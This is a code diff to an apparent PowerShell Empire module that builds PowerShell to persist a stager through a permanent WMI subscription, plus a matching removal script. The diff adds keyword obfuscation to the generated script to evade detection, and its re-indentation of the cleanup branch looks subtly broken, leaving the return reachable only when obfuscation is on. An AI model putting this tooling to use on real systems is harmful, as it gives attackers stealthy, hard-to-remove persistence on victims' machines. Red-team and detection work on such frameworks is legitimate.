@@ -1,6 +1,8 @@
 from __future__ import print_function
-from builtins import object
+
 import os
+from builtins import object
+
 from lib.common import helpers
 
 
@@ -12,8 +14,11 @@ class Module(object):
 
             'Author': ['@mattifestation', '@harmj0y', '@jbooz1'],
 
-            'Description': (
-            'Persist a stager (or script) using a permanent WMI subscription. This has a difficult detection/removal rating.'),
+            'Description': ('Persist a stager (or script) using a permanent WMI subscription. This has a difficult detection/removal rating.'),
+
+            'Software': '',
+
+            'Techniques': ['T1047'],
 
             'Background': False,
 
@@ -131,9 +136,9 @@ class Module(object):
             script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='" + subName + "'\" | Remove-WmiObject;"
             script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '" + subName + "'} | Remove-WmiObject;"
             script += "'WMI persistence removed.'"
-            if obfuscate:
-                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
-                                           obfuscationCommand=obfuscationCommand)
+            script = helpers.keyword_obfuscation(script)
+        if obfuscate:
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
             return script
 
         if extFile != '':
@@ -221,8 +226,10 @@ class Module(object):
         script += " Set-WmiInstance -Namespace \"root\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;"
 
         script += "'WMI persistence established " + statusMsg + "'"
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
                                        obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
 
         return script
